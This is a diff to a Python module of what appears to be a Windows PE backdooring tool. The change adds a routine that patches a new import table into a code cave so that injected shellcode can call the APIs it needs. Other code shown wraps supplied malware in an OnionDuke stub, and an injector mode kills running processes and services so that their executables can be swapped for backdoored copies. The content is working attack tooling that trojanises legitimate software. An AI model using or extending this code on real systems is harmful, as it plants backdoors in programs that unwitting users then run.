@@ -119,12 +119,13 @@ class pebin():
         self.PATCH_METHOD = PATCH_METHOD.lower()
         self.XP_MODE = XP_MODE
         self.flItms = {}
+        self.iat_cave_loc = 0
         self.SUPPLIED_BINARY = SUPPLIED_BINARY
         if self.PATCH_METHOD.lower() == 'automatic':
             self.CAVE_JUMPING = True
             self.ADD_SECTION = False
         if self.PATCH_METHOD.lower() == 'replace':
-            self.PATCH_DLL = False    
+            self.PATCH_DLL = False
 
     def run_this(self):
         if self.INJECTOR is True:
@@ -210,7 +211,6 @@ class pebin():
             self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
         else:
             self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'self.flItms[ImageBase]', hex(self.flItms['ImageBase'])
         self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
@@ -263,13 +263,10 @@ class pebin():
         self.flItms['LoadConfigTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
         #self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['BoundImportLocation'] = self.binary.tell()
-        #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
         self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.binary.seek(self.flItms['BoundImportLocation'])
         self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'first IATLOCIN CODE', hex(self.flItms['BoundImportLOCinCode'])
         self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'BoundImportSize', hex(self.flItms['BoundImportSize'])
         self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
@@ -408,7 +405,6 @@ class pebin():
                     if apiFound is False:
                         self.flItms['neededAPIs'].add(api)
 
-                
             except Exception as e:
                 print "Exception:", str(e)
             self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])
@@ -426,7 +422,7 @@ class pebin():
                 print "-" * 50
                 for section in self.flItms['Sections']:
                     print "Section Name", section[0]
-                    print "Virutal Size", hex(section[1])
+                    print "Virtual Size", hex(section[1])
                     print "Virtual Address", hex(section[2])
                     print "SizeOfRawData", hex(section[3])
                     print "PointerToRawData", hex(section[4])
@@ -456,8 +452,7 @@ class pebin():
             else:
                 self.binary.seek(32, 1)
 
-    def build_imports(self):
-
+    def populate_iat_values(self):
         self.flItms['iatdict'] = {}
         self.flItms['thunkSectionSize'] = 0
         self.flItms['lenDLLSection'] = 0
@@ -490,13 +485,14 @@ class pebin():
                     self.flItms['iatTransition'] += 20
                     self.flItms['dllCount'] += 1
                 if api in exports:
-                    #print aDLL, "has the api", api
                     self.flItms['iatdict'][aDLL][api] = 0
                     if self.flItms['Magic'] == 0x20B:
                         self.flItms['thunkSectionSize'] += 16
                     else:
                         self.flItms['thunkSectionSize'] += 8
                     self.flItms['apiCount'] += 1
+
+    def build_imports(self):
 
         #build first structure
 
@@ -516,6 +512,7 @@ class pebin():
             sectionCount += 16
 
         firstStructure += struct.pack("<QQI", 0x0, 0x0, 0x0)
+
         self.flItms['iatTransition'] = firstStructure
 
         #build the transition section:
@@ -551,7 +548,97 @@ class pebin():
                 newthunkSection += struct.pack("<I", 0x0)
 
         newthunkSection += newthunkSection
+
         self.flItms['addedIAT'] = self.flItms['iatTransition'] + newDLLSection + newthunkSection + newapiNameSection
+
+    def patch_in_new_iat(self):
+
+        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
+            print "[*] Patching Import Directory Table into a code cave"
+
+            self.populate_iat_values()
+
+            self.binary.seek(self.flItms['ImportTableFileOffset'], 0)
+
+            self.flItms['Import_Directory_Table'] = ''
+
+            while True:
+                check_chars = "\x00" * 20
+                read_data = self.binary.read(20)
+                if read_data == check_chars:
+                    #Found end of import directory
+                    break
+                self.flItms['Import_Directory_Table'] += read_data
+
+            # get size of new iat
+            newDLLSection = 0
+            newapiNameSection = 0
+            newthunkSection = 0
+            firstStructure = 0
+
+            for aDLL, api in self.flItms['iatdict'].iteritems():
+                firstStructure += 4 + 8 + 4 + 4
+
+            firstStructure += 8 + 8 + 4
+
+            for aDLL, api in self.flItms['iatdict'].iteritems():
+                newDLLSection += len(aDLL) + 1
+                for apiName, address in api.iteritems():
+                    newapiNameSection += 2 + len(apiName) + 1
+                    if self.flItms['Magic'] == 0x20B:
+                        newthunkSection += 8
+                    else:
+                        newthunkSection += 4
+                if self.flItms['Magic'] == 0x20B:
+                    newthunkSection += 8
+                else:
+                    newthunkSection += 4
+
+            newthunkSection += newthunkSection
+
+            self.flItms['sizeNewIAT'] = newDLLSection + newapiNameSection + newthunkSection + len(self.flItms['Import_Directory_Table']) + firstStructure
+            caveTracker = []
+            caveSpecs = []
+            RVA_offset = ''
+            for section in self.flItms['Sections']:
+                if section[4] <= self.flItms['ImportTableFileOffset'] <= section[4] + section[3]:
+                    self.flItms['ImportTableInSectionRange'] = (section[4], section[3] + section[4], section[3])
+
+            p = re.compile((self.flItms['sizeNewIAT'] + 12) * "\x00")
+            self.binary.seek(self.flItms['ImportTableInSectionRange'][0], 0)
+            for m in p.finditer(self.binary.read()):
+                caveSpecs.append(m.start() + self.flItms['ImportTableInSectionRange'][0] + 8)
+                caveSpecs.append(m.start() + self.flItms['ImportTableInSectionRange'][0] + self.flItms['sizeNewIAT'] + 12)
+                caveTracker.append(caveSpecs)
+                caveSpecs = []
+
+            caveSpecs = []
+            for section in self.flItms['Sections']:
+                if section[4] <= caveTracker[len(caveTracker) - 1][0] <= section[4] + section[3]:
+                    caveSpecs = caveTracker[len(caveTracker) - 1]
+                    RVA_offset = section[2] - section[4]
+
+            #  self.iat_cave_loc is to reverse the space for patching later
+            self.iat_cave_loc = caveSpecs
+            self.flItms['NewIAT_Loc'] = caveSpecs[0]
+
+            self.binary.seek(self.flItms['NewIAT_Loc'], 0)
+            self.binary.write(self.flItms['Import_Directory_Table'])
+            #Add new imports
+            self.flItms['BeginningOfNewImports'] = RVA_offset + caveSpecs[0] + len(self.flItms['Import_Directory_Table'])
+            self.build_imports()
+            self.binary.write(self.flItms['addedIAT'])
+            self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)
+            #RVA...
+            self.binary.write(struct.pack("<I", RVA_offset + self.flItms['NewIAT_Loc']))
+            self.binary.write(struct.pack("<I", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))
+            self.binary.seek(0)
+
+        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
+            if self.gather_file_info_win() is False:
+                return False
+
+        return True
 
     def create_new_iat(self):
         """
@@ -559,11 +646,8 @@ class pebin():
         """
         print "[*] Adding New Section for updated Import Table"
 
-        if "UPX".lower() in self.flItms['textSectionName'].lower():
-            print "[!] Cannot patch a new IAT into a UPX binary at this time."
-            return False
-
         with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
+            self.populate_iat_values()
             self.flItms['NewSectionSize'] = 0x1000
             self.flItms['SectionName'] = 'rdata1'  # less than 7 chars
             #Not the best way to find the new section (update for appending when fix found)
@@ -606,17 +690,16 @@ class pebin():
             self.binary.seek(self.flItms['ImportTableFileOffset'], 0)
             #-20 here
             self.flItms['Import_Directory_Table'] = ''
-            
+
             while True:
                 check_chars = "\x00" * 20
                 read_data = self.binary.read(20)
                 if read_data == check_chars:
                     #Found end of import directory
                     break
-                self.flItms['Import_Directory_Table'] +=  read_data
-                
+                self.flItms['Import_Directory_Table'] += read_data
+
             #self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)
-            #print "IDT", self.flItms['Import_Directory_Table'].encode('hex')
             self.binary.seek(self.flItms['newSectionPointerToRawData'], 0)  # moving to end of file
             #test write
             self.binary.write(self.flItms['Import_Directory_Table'])
@@ -624,6 +707,9 @@ class pebin():
             self.flItms['BeginningOfNewImports'] = self.flItms['SizeOfImage'] + len(self.flItms['Import_Directory_Table'])
             self.build_imports()
             #and remove here
+
+            print "len(self.flItms['addedIAT'])", len(self.flItms['addedIAT'])
+
             self.binary.write(self.flItms['addedIAT'])
             self.binary.write(struct.pack("<B", 0x0) * (self.flItms['NewSectionSize'] -
                               len(self.flItms['addedIAT']) - len(self.flItms['Import_Directory_Table']) + 20))
@@ -631,6 +717,7 @@ class pebin():
             self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
             self.binary.write(struct.pack("<I", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))
             self.binary.seek(0)
+            print "new IAT size:", self.flItms['ImportTableSize'] + self.flItms['apiCount'] * 8 + 20
             #For trimming File of cert (if there)
 
         #get file data again
@@ -709,11 +796,11 @@ class pebin():
         caveSpecs = []
         self.binary = open(self.FILE, 'r+b')
         self.binary.seek(0)
+        # Slow way
         while True:
             try:
                 s = struct.unpack("<b", self.binary.read(1))[0]
             except Exception as e:
-                #print str(e)
                 break
             if s == 0:
                 if count == 1:
@@ -782,22 +869,19 @@ class pebin():
         self.binary.seek(0)
 
         if self.PATCH_METHOD == 'automatic':
-            #  This is so much faster than the other
-
-            cave_set = set()
+            #  This is so much faster than the other method
             for k, item in enumerate(sorted(self.flItms['len_allshells'])):
                 cave_buffer = "\x00" * (item + 8)
                 p = re.compile(cave_buffer)
                 self.binary.seek(0)
                 for m in p.finditer(self.binary.read()):
-                    #print m.start(), m.group()
                     caveSpecs.append(m.start() + 4)
                     caveSpecs.append(m.start() + item + 8)
                     caveTracker.append(caveSpecs)
                     caveSpecs = []
             self.binary.seek(0)
-        
-        else:   
+
+        else:
             # Manual Slow method
             while True:
                 # TODO: ADD in Fast Mode
@@ -805,7 +889,6 @@ class pebin():
                 try:
                     s = struct.unpack("<b", self.binary.read(1))[0]
                 except:     # Exception as e:
-                    #print "CODE CAVE", str(e)
                     break
                 if s == 0:
                     if count == 1:
@@ -876,17 +959,24 @@ class pebin():
             availableCaves = {}
             # Take away the rsrc restriction, solved
             for caveNumber, caveValues in pickACave.iteritems():
+                # caveValues[0], Begin Cave, [1] End of Cave
+                # stay clear of iat_cave_loc starting
+                if caveValues[0] <= self.iat_cave_loc[0] <= caveValues[1]:
+                    continue
+                # stay clear of iat_cave_loc ending
+                if caveValues[0] <= self.iat_cave_loc[1] <= caveValues[1]:
+                    continue
                 if caveValues[0] is None:
                     continue
                 elif caveValues[3] >= 50:
                     availableCaves[caveNumber] = caveValues[3]
-                        
+
             #serialize caves:
 
             payloadDict = {}
             for k, item in enumerate(self.flItms['len_allshells']):
                 payloadDict[k] = item
-                
+
             # choose other Caves first.
 
             while True:
@@ -1143,7 +1233,6 @@ class pebin():
                     self.rsrc_structure[entry]["IDs"] = parse_ID(self.rsrc_structure[entry]["NumberofIDEntries"])
 
                 if self.rsrc_structure[entry]["NumberOfNamedEntries"]:
-                #print 'self.rsrc_structure[entry]["NumberOfNamedEntries"]', self.rsrc_structure[entry]["NumberOfNamedEntries"]
                     self.rsrc_structure[entry]["Names"] = parse_ID(self.rsrc_structure[entry]["NumberOfNamedEntries"])
 
                 self.rsrc_structure[entry]["NameIDs"] = merge_two_dicts(self.rsrc_structure[entry]["IDs"],
@@ -1152,7 +1241,6 @@ class pebin():
                 #Now get language
                 for name_id, offset in self.rsrc_structure[entry]["NameIDs"].iteritems():
                     self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)
-                    #print self.rsrc_structure
                     self.rsrc_structure[name_id] = parse_header()
                     self.rsrc_structure[name_id]["IDs"] = {}
                     self.rsrc_structure[name_id]["Names"] = {}
@@ -1168,7 +1256,6 @@ class pebin():
 
                     #now get Data Entry Details and write
                     for lanID, offsetDataEntry in self.rsrc_structure[name_id]["language"].iteritems():
-                        #print lanID
                         self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)
                         self.rsrc_structure[lanID] = parse_data_entry()
                     #Jump to Manifest
@@ -1254,8 +1341,6 @@ class pebin():
 
         stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))
 
-        #print 'stubPath', stubPath
-
         with open(self.FILE, "r+b") as self.binary:
             #check if OnionDuke Stub
             self.binary.seek(0x5C0, 0)
@@ -1294,7 +1379,7 @@ class pebin():
                 print "[*] Appending compressed user supplied binary after target binary"
                 od_stub.seek(0xfd40, 0)
                 od_stub.write(struct.pack("<I", self.od_size_malware))
-                
+
             else:
                 od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
                 #copy rsrc to memory
@@ -1505,8 +1590,17 @@ class pebin():
 
         if 'apis_needed' in self.flItms:
             self.check_apis(self.FILE)
+            if "UPX".lower() in self.flItms['textSectionName'].lower():
+                print "[!] Cannot patch a new IAT into a UPX binary at this time."
+                return False
             if self.flItms['neededAPIs'] != set():
-                #ADD new section with IAT here, then patch that binary.
+                iat_result = self.patch_in_new_iat()
+                print "[*] Checking updated IAT for thunks"
+                self.check_apis(self.flItms['backdoorfile'])
+            if iat_result is False or self.flItms['neededAPIs'] != set():
+                #reset the file
+                print "[!] Patching Import Directory in code cave failed"
+                shutil.copy2(self.FILE, self.flItms['backdoorfile'])
                 iat_result = self.create_new_iat()
                 if iat_result is False:
                     return False
@@ -1691,7 +1785,6 @@ class pebin():
         if self.SHELL not in dir(self.flItms['bintype']):
             print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
             for item in dir(self.flItms['bintype']):
-                #print item
                 if "__" in item:
                     continue
                 elif item in ignores:
@@ -1774,10 +1867,8 @@ class pebin():
             sys.exit()
         winversion = platform.version()
         rootdir = os.path.splitdrive(sys.executable)[0]
-        #print rootdir
         targetdirs = []
         excludedirs = []
-        #print system_info
         winXP2003x86targetdirs = [rootdir + '\\']
         winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                                    rootdir + '\\RECYCLER\\',
@@ -1836,20 +1927,16 @@ class pebin():
             for root, subFolders, files in os.walk(path):
                 for directory in excludedirs:
                     if directory.lower() in root.lower():
-                        #print directory.lower(), root.lower()
-                        #print "Path not allowed", root
                         exclude = True
-                        #print exclude
                         break
                 if exclude is False:
                     for _file in files:
                         f = os.path.join(root, _file)
                         for target, items in list_of_targets.iteritems():
                             if target.lower() == _file.lower():
-                                #print target, f
                                 print "-- Found the following file:", root + '\\' + _file
                                 filelist.add(f)
-                                #print exclude
+
                 exclude = False
 
         #grab tasklist
@@ -1864,8 +1951,6 @@ class pebin():
         for process in ap:
             process_list.append(process.split())
 
-        #print process_list
-        #print filelist
         for target in filelist:
             service_target = False
             running_proc = False
@@ -1875,22 +1960,18 @@ class pebin():
             #   continue
             filename = os.path.basename(target)
             for process in process_list:
-                #print process
                 for setprocess, items in list_of_targets.iteritems():
                     if setprocess.lower() in target.lower():
-                        #print setprocess, process
                         for item in items[0]:
                             if item.lower() in [x.lower() for x in process]:
                                 print "- Killing process:", item
                                 try:
-                                    #print process[1]
                                     os.system("taskkill /F /PID %i" %
                                               int(process[1]))
                                     running_proc = True
                                 except Exception as e:
                                     print str(e)
                         if setprocess.lower() in [x.lower() for x in process]:
-                            #print True, items[0], items[1]
                             if items[1] is not None:
                                 print "- Killing Service:", items[1]
                                 try:
@@ -1933,7 +2014,6 @@ class pebin():
                 os.remove(self.FILE + self.SUFFIX)
 
             if service_target is True:
-                #print "items[1]:", list_of_targets[filename][1]
                 os.system('net start %s' % list_of_targets[filename][1])
             else:
                 try:
